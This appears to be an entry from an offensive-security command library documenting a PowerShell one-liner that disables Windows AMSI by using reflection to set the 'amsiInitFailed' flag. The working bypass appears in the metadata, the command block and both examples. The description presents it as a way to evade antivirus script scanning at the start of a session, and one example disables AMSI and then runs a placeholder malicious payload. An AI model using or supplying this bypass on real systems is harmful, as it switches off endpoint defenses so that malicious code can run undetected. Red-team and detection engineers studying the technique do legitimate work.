---
id: e5b50126-7263-4ef8-b4dd-c57d0831db10
type: command
executor: powershell
data: >-
  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
output: null
created_at: '2023-04-06T03:56:26.000470+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - defense-evasion
  - amsi-bypass
verified: true
validated: true
---

# powershell-set-amsiinitfailed-true

## Command

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

## Description

This PowerShell command disables AMSI by using reflection to set the internal 'amsiInitFailed' flag to true in the AmsiUtils assembly. Use it at the start of a PowerShell session to bypass script scanning by antivirus tools integrated with AMSI.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | This is a fixed one-liner with no user-supplied parameters. | N/A |

## Examples

### Basic Usage

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### Advanced Usage

Embed in a script:

```powershell
# Disable AMSI first
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Now run payload
Invoke-Expression 'malicious code'
```

## Expected Output

No output is produced on success; the command runs silently. If it fails (e.g., due to execution policy or missing assembly), an error like 'Unable to find type' may appear. Verify by testing a detectable string such as `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').GetValue($null)` returning null or failed state.

## Related

- [[procedures/Reflection-Method-to-Disable-AMSI]]
